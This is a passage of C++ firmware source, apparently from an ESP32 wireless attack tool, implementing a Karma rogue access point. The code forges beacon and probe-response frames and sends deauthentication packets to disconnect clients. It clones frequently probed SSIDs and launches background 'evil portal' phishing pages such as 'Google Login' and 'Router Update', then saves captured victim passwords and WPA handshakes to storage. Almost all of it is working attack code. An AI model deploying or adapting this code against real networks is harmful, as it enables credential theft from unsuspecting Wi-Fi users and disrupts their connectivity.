            buffer[pos++] = sizeof(rsn_wpa3);
            memcpy_P(&buffer[pos], rsn_wpa3, sizeof(rsn_wpa3));
            pos += sizeof(rsn_wpa3);
        } else {
            buffer[pos++] = sizeof(rsn_wpa2);
            memcpy_P(&buffer[pos], rsn_wpa2, sizeof(rsn_wpa2));
            pos += sizeof(rsn_wpa2);
        }
    }
    buffer[pos++] = 0x2d;
    buffer[pos++] = 0x1a;
    memcpy_P(&buffer[pos], ht_cap, sizeof(ht_cap));
    pos += sizeof(ht_cap);
    buffer[pos++] = 0x7f;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x40;
    return pos;
}

size_t buildBeaconFrame(uint8_t *buffer, const String &ssid, uint8_t channel, const RSNInfo &rsn) {
    uint8_t pos = 0;
    buffer[pos++] = 0x80;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    memset(&buffer[pos], 0xFF, 6);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    static uint64_t timestamp = 0;
    timestamp += 1024;
    for (int i = 0; i < 8; i++) buffer[pos++] = (timestamp >> (8 * i)) & 0xFF;
    buffer[pos++] = 0x64;
    buffer[pos++] = 0x00;
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x31;
        buffer[pos++] = 0x04;
    } else {
        buffer[pos++] = 0x21;
        buffer[pos++] = 0x04;
    }
    buffer[pos++] = 0x00;
    buffer[pos++] = (uint8_t)ssid.length();
    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&buffer[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    buffer[pos++] = 0x01;
    buffer[pos++] = sizeof(beacon_rates);
    memcpy_P(&buffer[pos], beacon_rates, sizeof(beacon_rates));
    pos += sizeof(beacon_rates);
    buffer[pos++] = 0x03;
    buffer[pos++] = 0x01;
    buffer[pos++] = channel;
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x30;
        if (rsn.akmSuite == 2) {
            buffer[pos++] = sizeof(rsn_wpa3);
            memcpy_P(&buffer[pos], rsn_wpa3, sizeof(rsn_wpa3));
            pos += sizeof(rsn_wpa3);
        } else {
            buffer[pos++] = sizeof(rsn_wpa2);
            memcpy_P(&buffer[pos], rsn_wpa2, sizeof(rsn_wpa2));
            pos += sizeof(rsn_wpa2);
        }
    }
    buffer[pos++] = 0x05;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    return pos;
}

void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
    if (ssid.isEmpty() || channel < 1 || channel > 14) return;
    uint8_t beaconPacket[128] = {0};
    int pos = 0;
    beaconPacket[pos++] = 0x80;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    memset(&beaconPacket[pos], 0xFF, 6);
    pos += 6;
    uint8_t sourceMAC[6] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};
    memcpy(&beaconPacket[pos], sourceMAC, 6);
    pos += 6;
    memcpy(&beaconPacket[pos], sourceMAC, 6);
    pos += 6;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    uint64_t timestamp = esp_timer_get_time() / 1000;
    memcpy(&beaconPacket[pos], &timestamp, 8);
    pos += 8;
    beaconPacket[pos++] = 0x64;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = 0x04;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = ssid.length();
    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&beaconPacket[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = sizeof(beacon_rates);
    memcpy_P(&beaconPacket[pos], beacon_rates, sizeof(beacon_rates));
    pos += sizeof(beacon_rates);
    beaconPacket[pos++] = 0x03;
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = channel;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, pos, false);
}

void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
    if (ssid.isEmpty() || mac.isEmpty()) return;
    uint8_t probeResponse[128] = {0};
    uint8_t pos = 0;
    probeResponse[pos++] = 0x50;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;
    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &probeResponse[pos], &probeResponse[pos+1], &probeResponse[pos+2],
           &probeResponse[pos+3], &probeResponse[pos+4], &probeResponse[pos+5]);
    pos += 6;
    memcpy(&probeResponse[pos], currentBSSID, 6);
    pos += 6;
    memcpy(&probeResponse[pos], currentBSSID, 6);
    pos += 6;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;
    for (int i = 0; i < 8; i++) probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x64;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = 0x04;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = ssid.length();
    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&probeResponse[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = sizeof(beacon_rates);
    memcpy_P(&probeResponse[pos], beacon_rates, sizeof(beacon_rates));
    pos += sizeof(beacon_rates);
    probeResponse[pos++] = 0x03;
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = channel;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, probeResponse, pos, false);
    karmaResponsesSent++;
}

void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
    if (!karmaConfig.enableDeauth) return;

    unsigned long now = millis();
    if (now - lastDeauthReset > DEAUTH_BURST_WINDOW) {
        memset(deauthCount, 0, sizeof(deauthCount));
        lastDeauthReset = now;
    }

    if (channel >= 1 && channel <= 14) {
        if (deauthCount[channel-1] >= MAX_DEAUTH_PER_SECOND) {
            return;
        }
        deauthCount[channel-1]++;
    }

    if (activePortalChannel > 0 && channel != activePortalChannel) {
        return;
    }

    uint8_t deauthPacket[26] = {0};
    deauthPacket[0] = 0xC0;
    deauthPacket[1] = 0x00;
    if (broadcast) memset(&deauthPacket[2], 0xFF, 6);
    else sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &deauthPacket[2], &deauthPacket[3], &deauthPacket[4],
                &deauthPacket[5], &deauthPacket[6], &deauthPacket[7]);
    memcpy(&deauthPacket[8], currentBSSID, 6);
    memcpy(&deauthPacket[14], currentBSSID, 6);
    deauthPacket[20] = 0x00;
    deauthPacket[21] = 0x00;
    deauthPacket[22] = 0x01;
    deauthPacket[23] = 0x00;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 24, false);
    if (err == ESP_OK) {
        deauthPacketsSent++;
    }
}

void sendBeaconFrames() {
    if (activePortalChannel > 0) return;

    unsigned long now = millis();

    if (beaconsInBurst < BEACON_BURST_SIZE) {
        if (now - lastBeaconBurst > BEACON_BURST_INTERVAL) {
            if (!activeNetworks.empty()) {
                uint8_t netIndex = beaconsInBurst % activeNetworks.size();
                uint8_t beaconFrame[256];
                size_t frameLen = buildBeaconFrame(beaconFrame, 
                    activeNetworks[netIndex].ssid,
                    activeNetworks[netIndex].channel, 
                    activeNetworks[netIndex].rsn);
                esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, frameLen, false);
                beaconsSent++;
            }
            beaconsInBurst++;
            lastBeaconBurst = now;
        }
    } else {
        if (now - lastBeaconBurst > LISTEN_WINDOW) {
            beaconsInBurst = 0;
        }
    }
}

void processResponseQueue() {
    unsigned long now = millis();
    while (!responseQueue.empty()) {
        ProbeResponseTask &task = responseQueue.front();
        if (now - task.timestamp > RESPONSE_TIMEOUT_MS) { responseQueue.pop(); continue; }
        uint8_t responseFrame[256];
        size_t frameLen = buildEnhancedProbeResponse(responseFrame, task.ssid, task.targetMAC,
                                                    task.channel, task.rsn, false);
        esp_wifi_set_channel(task.channel, WIFI_SECOND_CHAN_NONE);
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, responseFrame, frameLen, false);
        if (err == ESP_OK) {
            karmaResponsesSent++;
            if (networkHistory.size() < MAX_NETWORK_HISTORY) {
                auto it = networkHistory.find(task.ssid);
                if (it == networkHistory.end()) {
                    NetworkHistory history;
                    history.ssid = task.ssid;
                    history.responsesSent = 1;
                    history.lastResponse = now;
                    history.successfulConnections = 0;
                    networkHistory[task.ssid] = history;
                } else {
                    it->second.responsesSent++;
                    it->second.lastResponse = now;
                }
            }
            bool found = false;
            for (auto &net : activeNetworks) {
                if (net.ssid == task.ssid) { found = true; net.lastActivity = now; break; }
            }
            if (!found && activeNetworks.size() < MAX_CONCURRENT_SSIDS) {
                ActiveNetwork net;
                net.ssid = task.ssid;
                net.channel = task.channel;
                net.rsn = task.rsn;
                net.lastActivity = now;
                net.lastBeacon = 0;
                activeNetworks.push_back(net);
            }
        }
        responseQueue.pop();
    }
}

void queueProbeResponse(const ProbeRequest &probe, const RSNInfo &rsn) {
    if (macBlacklist.find(probe.mac) != macBlacklist.end()) {
        if (millis() - macBlacklist[probe.mac] < 60000) return;
        else macBlacklist.erase(probe.mac);
    }
    if (responseQueue.size() >= 10) return;
    if (probe.ssid == "*WILDCARD*") return;
    ProbeResponseTask task;
    task.ssid = probe.ssid;
    task.targetMAC = probe.mac;
    task.channel = probe.channel;
    task.rsn = rsn;
    task.timestamp = millis();
    responseQueue.push(task);
    if (responseQueue.size() <= 3) processResponseQueue();
}

void checkForAssociations() {
    unsigned long now = millis();
    for (auto &client : clientBehaviors) {
        if (client.second.probeCount > 5 && now - client.second.lastSeen < 5000) {
            for (const auto &ssid : client.second.probedSSIDs) {
                auto it = networkHistory.find(ssid);
                if (it != networkHistory.end()) {
                    if (now - it->second.lastResponse < 10000) it->second.successfulConnections++;
                }
            }
        }
    }
}

void smartChannelHop() {
    if (!auto_hopping) return;

    if (activePortalChannel > 0) {
        if (channl != activePortalChannel - 1) {
            channl = activePortalChannel - 1;
            esp_wifi_set_channel(activePortalChannel, WIFI_SECOND_CHAN_NONE);
        }
        return;
    }

    unsigned long now = millis();
    if (now - last_ChannelChange < hop_interval) return;
    currentPriorityChannel = (currentPriorityChannel + 1) % NUM_PRIORITY_CHANNELS;
    uint8_t channel = pgm_read_byte(&priorityChannels[currentPriorityChannel]);
    channl = channel - 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    last_ChannelChange = now;
}

void updateChannelActivity(uint8_t channel) {
    if (channel >= 1 && channel <= 14) channelActivity[channel - 1]++;
}

uint8_t getBestChannel() {
    uint8_t best = 1;
    uint16_t maxActivity = 0;
    for (int i = 0; i < 14; i++) {
        if (channelActivity[i] > maxActivity) { maxActivity = channelActivity[i]; best = i + 1; }
    }
    return best;
}

void updateSSIDFrequency(const String &ssid) {
    if (ssid.isEmpty() || ssid == "*WILDCARD*") return;
    if (ssidFrequency.size() < MAX_POPULAR_SSIDS) {
        ssidFrequency[ssid]++;
    }
    static unsigned long lastSort = 0;
    if (millis() - lastSort > 5000) {
        lastSort = millis();
        popularSSIDs.clear();
        for (const auto &pair : ssidFrequency) {
            popularSSIDs.push_back(std::make_pair(pair.first, pair.second));
            if (popularSSIDs.size() >= MAX_POPULAR_SSIDS) break;
        }
        std::sort(popularSSIDs.begin(), popularSSIDs.end(),
            [](const auto &a, const auto &b) { return a.second > b.second; });
    }
}

void checkCloneAttackOpportunities() {
    if (!attackConfig.enableCloneMode || popularSSIDs.empty()) return;
    if (millis() - lastFrequencyReset > SSID_FREQUENCY_RESET) {
        ssidFrequency.clear();
        popularSSIDs.clear();
        lastFrequencyReset = millis();
        return;
    }
    size_t maxNetworks = std::min((size_t)attackConfig.maxCloneNetworks, popularSSIDs.size());
    for (size_t i = 0; i < maxNetworks; i++) {
        const auto &ssidPair = popularSSIDs[i];
        if (ssidPair.second >= attackConfig.cloneThreshold) {
            bool alreadyAttacking = false;
            for (const auto &portal : pendingPortals) {
                if (portal.ssid == ssidPair.first && portal.isCloneAttack) { alreadyAttacking = true; break; }
            }
            if (!alreadyAttacking && pendingPortals.size() < MAX_PENDING_PORTALS) {
                PendingPortal portal;
                portal.ssid = ssidPair.first;
                portal.channel = getBestChannel();
                portal.timestamp = millis();
                portal.launched = false;
                portal.templateName = selectedTemplate.name;
                portal.templateFile = selectedTemplate.filename;
                portal.isDefaultTemplate = selectedTemplate.isDefault;
                portal.verifyPassword = selectedTemplate.verifyPassword;
                portal.priority = 100;
                portal.tier = TIER_CLONE;
                portal.duration = (uint16_t)attackConfig.cloneDuration;
                portal.isCloneAttack = true;
                portal.probeCount = ssidPair.second;
                pendingPortals.push_back(portal);
            }
        }
    }
}

// Background portal management with channel locking
void checkPortals() {
    if (karmaPaused) return;
    unsigned long now = millis();
    
    if (now - lastPortalHeartbeat < PORTAL_HEARTBEAT_INTERVAL) return;
    
    if (activePortals.empty()) {
        lastPortalHeartbeat = now;
        return;
    }
    
    bool victimActive = false;
    uint8_t lockedChannel = 0;
    int victimPortalIndex = -1;
    
    for (size_t i = 0; i < activePortals.size(); i++) {
        BackgroundPortal* p = activePortals[i];
        if (p->victimConnected && (now - p->lastClientActivity < 5000)) {
            victimActive = true;
            lockedChannel = p->channel;
            victimPortalIndex = i;
            break;
        }
    }
    
    if (victimActive) {
        if (channl != lockedChannel - 1) {
            channl = lockedChannel - 1;
            setChannelWithSecond(lockedChannel);
        }
        
        BackgroundPortal* portal = activePortals[victimPortalIndex];
        portal->instance->processRequests();
        portal->lastHeartbeat = now;
        
        if (portal->instance->hasCredentials()) {
            portal->hasCreds = true;
            portal->capturedPassword = portal->instance->getCapturedPassword();
            portal->markedForRemoval = true;
            
            savePortalCredentials(
                portal->ssid,
                "user",
                portal->capturedPassword,
                "unknown",
                portal->channel,
                portal->instance->getApName(),
                portal->portalId
            );
            
            delete portal->instance;
            portal->instance = nullptr;
        }
        
        lastPortalHeartbeat = now;
        
        activePortals.erase(std::remove_if(activePortals.begin(), activePortals.end(),
            [now](BackgroundPortal* p) {
                if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
                    if (p->instance) delete p->instance;
                    delete p;
                    return true;
                }
                return false;
            }), activePortals.end());
        
        return;
    }
    
    BackgroundPortal* portal = activePortals[nextPortalIndex];
    
    setChannelWithSecond(portal->channel);
    portal->instance->processRequests();
    
    if (portal->instance->hasCredentials()) {
        portal->hasCreds = true;
        portal->capturedPassword = portal->instance->getCapturedPassword();
        portal->markedForRemoval = true;
        
        savePortalCredentials(
            portal->ssid,
            "user",
            portal->capturedPassword,
            "unknown",
            portal->channel,
            portal->instance->getApName(),
            portal->portalId
        );
        
        delete portal->instance;
        portal->instance = nullptr;
    }
    
    portal->lastHeartbeat = now;
    
    nextPortalIndex = (nextPortalIndex + 1) % activePortals.size();
    lastPortalHeartbeat = now;
    
    activePortals.erase(std::remove_if(activePortals.begin(), activePortals.end(),
        [now](BackgroundPortal* p) {
            if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
                if (p->instance) delete p->instance;
                delete p;
                return true;
            }
            return false;
        }), activePortals.end());
}

// Launch a portal in background mode (no UI)
void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &templateName) {
    if (activePortals.size() >= MAX_PENDING_PORTALS) return;
    
    BackgroundPortal* portal = new BackgroundPortal();
    portal->ssid = ssid;
    portal->channel = channel;
    portal->launchTime = millis();
    portal->lastHeartbeat = millis();
    portal->hasCreds = false;
    portal->victimConnected = false;
    portal->lastClientActivity = 0;
    portal->markedForRemoval = false;
    portal->portalId = generatePortalId(templateName);
    
    portal->instance = new EvilPortal(ssid, channel, false, false, true, true);
    
    activePortals.push_back(portal);
    Serial.printf("[PORTAL] Launched background portal %s on ch%d (ID: %s)\n", 
                  ssid.c_str(), channel, portal->portalId.c_str());
}

void loadPortalTemplates() {
    portalTemplates.clear();
    portalTemplates.push_back({"Google Login", "", true, false});
    portalTemplates.push_back({"Router Update", "", true, true});
    if (LittleFS.begin()) {
        if (!LittleFS.exists("/PortalTemplates")) LittleFS.mkdir("/PortalTemplates");
        if (LittleFS.exists("/PortalTemplates")) {
            File root = LittleFS.open("/PortalTemplates");
            File file = root.openNextFile();
            while (file && portalTemplates.size() < MAX_PORTAL_TEMPLATES) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    String filename = String(file.name());
                    tmpl.name = getDisplayName("/" + filename, false);
                    tmpl.filename = "/PortalTemplates/" + filename;
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;
                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) tmpl.verifyPassword = true;
                    portalTemplates.push_back(tmpl);
                }
                file = root.openNextFile();
            }
        }
        LittleFS.end();
    }
    FS *fs = nullptr;
    if (getFsStorage(fs) && fs == &SD) {
        if (!SD.exists("/PortalTemplates")) SD.mkdir("/PortalTemplates");
        if (SD.exists("/PortalTemplates")) {
            File root = SD.open("/PortalTemplates");
            File file = root.openNextFile();
            while (file && portalTemplates.size() < MAX_PORTAL_TEMPLATES) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    String filename = String(file.name());
                    tmpl.name = getDisplayName("/" + filename, true);
                    tmpl.filename = "/PortalTemplates/" + filename;
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;
                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) tmpl.verifyPassword = true;
                    portalTemplates.push_back(tmpl);
                }
                file = root.openNextFile();
            }
        }
    }
}

bool selectPortalTemplate(bool isInitialSetup) {
    loadPortalTemplates();
    if (portalTemplates.empty()) {
        displayTextLine("No templates found!");
        delay(2000);
        return false;
    }
    drawMainBorderWithTitle("SELECT TEMPLATE");
    std::vector<Option> templateOptions;
    for (const auto &tmpl : portalTemplates) {
        String displayName = tmpl.name;
        if (tmpl.isDefault) displayName = "[D] " + displayName;
        if (tmpl.verifyPassword) displayName += " (verify)";
        templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
            selectedTemplate = tmpl;
            templateSelected = true;
            if (isInitialSetup) {
                drawMainBorderWithTitle("KARMA SETUP");
                displayTextLine("Selected: " + tmpl.name);
                delay(1000);
            }
        }});
    }
    templateOptions.push_back({"Load Custom File", [=]() {
        drawMainBorderWithTitle("LOAD FROM");
        std::vector<Option> directOptions;
        
        FS *fs = nullptr;
        if (getFsStorage(fs) && fs == &SD) {
            directOptions.push_back({"SD Card", [=]() {
                drawMainBorderWithTitle("BROWSE SD");
                String templateFile = loopSD(SD, true, "HTML", "/");
                if (templateFile.length() > 0) {
                    PortalTemplate customTmpl;
                    String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
                    customTmpl.name = getDisplayName("/" + filename, true);
                    customTmpl.filename = templateFile;
                    customTmpl.isDefault = false;
                    customTmpl.verifyPassword = false;
                    File file = SD.open(templateFile, FILE_READ);
                    if (file) {
                        String firstLine = file.readStringUntil('\n');
                        file.close();
                        if (firstLine.indexOf("verify=\"true\"") != -1) {
                            customTmpl.verifyPassword = true;
                        }
                    }
                    selectedTemplate = customTmpl;
                    templateSelected = true;
                    if (portalTemplates.size() < MAX_PORTAL_TEMPLATES) portalTemplates.push_back(customTmpl);
                    drawMainBorderWithTitle("SELECTED");
                    displayTextLine(customTmpl.name);
                    delay(1500);
                    if (isInitialSetup) {
                        drawMainBorderWithTitle("KARMA SETUP");
                        displayTextLine("Selected: " + customTmpl.name);
                        delay(1000);
                    }
                }
            }});
        }
        
        directOptions.push_back({"LittleFS", [=]() {
            drawMainBorderWithTitle("BROWSE LITTLEFS");
            if (LittleFS.begin()) {
                String templateFile = loopSD(LittleFS, true, "HTML", "/");
                if (templateFile.length() > 0) {
                    PortalTemplate customTmpl;
                    String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
                    customTmpl.name = getDisplayName("/" + filename, false);
                    customTmpl.filename = templateFile;
                    customTmpl.isDefault = false;
                    customTmpl.verifyPassword = false;
                    File file = LittleFS.open(templateFile, FILE_READ);
                    if (file) {
                        String firstLine = file.readStringUntil('\n');
                        file.close();
                        if (firstLine.indexOf("verify=\"true\"") != -1) {
                            customTmpl.verifyPassword = true;
                        }
                    }
                    selectedTemplate = customTmpl;
                    templateSelected = true;
                    if (portalTemplates.size() < MAX_PORTAL_TEMPLATES) portalTemplates.push_back(customTmpl);
                    drawMainBorderWithTitle("SELECTED");
                    displayTextLine(customTmpl.name);
                    delay(1500);
                    if (isInitialSetup) {
                        drawMainBorderWithTitle("KARMA SETUP");
                        displayTextLine("Selected: " + customTmpl.name);
                        delay(1000);
                    }
                }
                LittleFS.end();
            } else {
                displayTextLine("LittleFS error!");
                delay(1000);
            }
        }});
        
        directOptions.push_back({"Back", [=]() {}});
        loopOptions(directOptions);
        drawMainBorderWithTitle("SELECT TEMPLATE");
    }});
    templateOptions.push_back({"Disable Auto-Portal", [=]() {
        karmaConfig.enableAutoPortal = false;
        templateSelected = false;
        if (isInitialSetup) {
            drawMainBorderWithTitle("KARMA SETUP");
            displayTextLine("Auto-portal disabled");
            delay(1000);
        }
    }});
    templateOptions.push_back({"Reload Templates", [=]() {
        loadPortalTemplates();
        displayTextLine("Templates reloaded");
        delay(1000);
    }});
    loopOptions(templateOptions);
    return templateSelected;
}

void saveCredentialsToFile(String ssid, String password) {
    FS *saveFs = nullptr;
    if (!getFsStorage(saveFs)) return;
    String filename = "/ProbeData/credentials.txt";
    if (!saveFs->exists(filename)) {
        File initFile = saveFs->open(filename, FILE_WRITE);
        if (initFile) {
            initFile.println("=== CAPTURED CREDENTIALS ===");
            initFile.println("Timestamp,SSID,Password");
            initFile.close();
        }
    }
    File file = saveFs->open(filename, FILE_APPEND);
    if (file) {
        file.printf("%lu,\"%s\",\"%s\"\n", millis(), ssid.c_str(), password.c_str());
        file.close();
    }
}

void launchTieredEvilPortal(PendingPortal &portal) {
    activePortalChannel = portal.channel;
    auto_hopping = false;
    channl = portal.channel - 1;

    Serial.printf("[TIER-%d] Launching background portal for %s\n", portal.tier, portal.ssid.c_str());
    launchBackgroundPortal(portal.ssid, portal.channel, portal.templateName);
    
    activePortalChannel = 0;
    auto_hopping = true;
    
    if (portal.isCloneAttack) cloneAttacksLaunched++;
    else autoPortalsLaunched++;
    screenNeedsRedraw = true;
}

void executeTieredAttackStrategy() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
    std::sort(pendingPortals.begin(), pendingPortals.end(),
        [](const PendingPortal &a, const PendingPortal &b) {
            if (a.isCloneAttack && !b.isCloneAttack) return true;
            if (!a.isCloneAttack && b.isCloneAttack) return false;
            return a.priority > b.priority;
        });
    if (attackConfig.enableTieredAttack) {
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->isCloneAttack && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->tier == TIER_HIGH && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
        std::vector<PendingPortal> mediumTargets;
        for (const auto &portal : pendingPortals) {
            if (portal.tier == TIER_MEDIUM && !portal.launched) {
                mediumTargets.push_back(portal);
                if (mediumTargets.size() >= 2) break;
            }
        }
        if (!mediumTargets.empty()) {
            for (auto &target : mediumTargets) {
                for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ++it) {
                    if (it->ssid == target.ssid && it->targetMAC == target.targetMAC) {
                        launchTieredEvilPortal(*it);
                        it->launched = true;
                        pendingPortals.erase(it);
                        return;
                    }
                }
            }
        }
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->tier == TIER_FAST && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
    } else {
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (!it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
    }
}

void checkPendingPortals() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
    unsigned long now = millis();
    pendingPortals.erase(std::remove_if(pendingPortals.begin(), pendingPortals.end(),
        [now](const PendingPortal &p) { return (now - p.timestamp > 300000); }),
        pendingPortals.end());
    executeTieredAttackStrategy();
}

void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd) {
    Serial.printf("[MANUAL] Launching background portal for %s (ch%d)\n", ssid.c_str(), channel);
    launchBackgroundPortal(ssid, channel, selectedTemplate.name);
}

void handleBroadcastResponse(const String& ssid, const String& mac) {
    if (broadcastAttack.isActive() && !karmaPaused) {
        broadcastAttack.processProbeResponse(ssid, mac);
        
        uint32_t fingerprint = 0;
        for (int i = 0; i < mac.length(); i++) {
            fingerprint = ((fingerprint << 5) + fingerprint) + mac.charAt(i);
        }
        
        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;
        
        auto it = clientBehaviors.find(fingerprint);
        if (it == clientBehaviors.end()) {
            ClientBehavior behavior;
            behavior.fingerprint = fingerprint;
            behavior.lastMAC = mac;
            behavior.firstSeen = millis();
            behavior.lastSeen = millis();
            behavior.probeCount = 1;
            behavior.avgRSSI = -50;
            behavior.probedSSIDs.push_back(ssid);
            behavior.favoriteChannel = pgm_read_byte(&karma_channels[channl % 14]);
            behavior.lastKarmaAttempt = 0;
            behavior.isVulnerable = true;
            clientBehaviors[fingerprint] = behavior;
            uniqueClients++;
            
            if (karmaConfig.enableAutoKarma && pendingPortals.size() < MAX_PENDING_PORTALS) {
                PendingPortal portal;
                portal.ssid = ssid;
                portal.channel = pgm_read_byte(&karma_channels[channl % 14]);
                portal.targetMAC = mac;
                portal.timestamp = millis();
                portal.launched = false;
                portal.templateName = selectedTemplate.name;
                portal.templateFile = selectedTemplate.filename;
                portal.isDefaultTemplate = selectedTemplate.isDefault;
                portal.verifyPassword = selectedTemplate.verifyPassword;
                portal.priority = 70;
                portal.tier = TIER_HIGH;
                portal.duration = attackConfig.highTierDuration;
                portal.isCloneAttack = false;
                portal.probeCount = 1;
                pendingPortals.push_back(portal);
            }
        }
    }
}

void saveProbesToPCAP(FS &fs) {
    if (!storageAvailable) return;
    String filename = "/ProbeData/karma_capture_" + String(millis()) + ".pcap";
    File file = fs.open(filename, FILE_WRITE);
    if (!file) {
        Serial.println("[PCAP] Failed to create file");
        return;
    }

    uint32_t magic = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 105;

    file.write((uint8_t*)&magic, 4);
    file.write((uint8_t*)&version_major, 2);
    file.write((uint8_t*)&version_minor, 2);
    file.write((uint8_t*)&thiszone, 4);
    file.write((uint8_t*)&sigfigs, 4);
    file.write((uint8_t*)&snaplen, 4);
    file.write((uint8_t*)&network, 4);

    int written = 0;
    for (int i = 0; i < MAX_PROBE_BUFFER && written < 50; i++) {
        int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
        const ProbeRequest &probe = probeBuffer[idx];

        if (probe.frame_len == 0) continue;

        uint32_t ts_sec = probe.timestamp / 1000;
        uint32_t ts_usec = (probe.timestamp % 1000) * 1000;

        file.write((uint8_t*)&ts_sec, 4);
        file.write((uint8_t*)&ts_usec, 4);
        file.write((uint8_t*)&probe.frame_len, 4);
        file.write((uint8_t*)&probe.frame_len, 4);
        file.write(probe.frame, probe.frame_len);
        written++;
    }

    file.close();

    if (written > 0) {
        Serial.printf("[PCAP] Saved %d probe requests to %s\n", written, filename.c_str());
        displayTextLine("PCAP: " + String(written) + " packets");
    } else {
        Serial.println("[PCAP] No probe frames to save");
        displayTextLine("No probe frames captured");
    }
    delay(1000);
}

void saveHandshakeToFile(const HandshakeCapture &hs) {
    FS *fs = nullptr;
    if (!getFsStorage(fs)) return;
    
    if (!fs->exists("/BrucePCAP/handshakes")) {
        fs->mkdir("/BrucePCAP/handshakes");
    }
    
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X%02X%02X%02X%02X%02X",
             hs.bssid[0], hs.bssid[1], hs.bssid[2],
             hs.bssid[3], hs.bssid[4], hs.bssid[5]);
    
    String filename = "/BrucePCAP/handshakes/HS_" + String(macStr) + "_" + hs.ssid + ".pcap";
    filename.replace(" ", "_");
    filename.replace("*", "");
    
    File file = fs->open(filename, FILE_APPEND);
    if (file) {
        uint32_t ts_sec = hs.timestamp / 1000;
        uint32_t ts_usec = (hs.timestamp % 1000) * 1000;
        file.write((uint8_t*)&ts_sec, 4);
